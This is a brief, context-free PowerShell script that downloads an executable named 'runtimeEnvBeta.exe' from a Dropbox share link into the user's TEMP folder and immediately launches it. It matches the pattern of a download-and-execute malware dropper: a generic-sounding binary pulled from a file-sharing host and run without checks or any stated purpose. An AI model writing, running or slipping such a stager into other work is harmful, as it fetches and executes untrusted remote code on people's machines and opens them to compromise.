$client = New-Object System.Net.WebClient
$userDir = $env:TEMP
$output = "$userDir\runtimeEnvBeta.exe"

$client.DownloadFile("https://www.dropbox.com/scl/fi/ga218flxjm1xgi4pi3ozi/runtimeEnvBeta.exe?rlkey=kc66e1ez8e042xu8m40he4rd7&st=ctzsgvav&dl=1", "$userDir\runtimeEnvBeta.exe")
Start-Process -FilePath $output
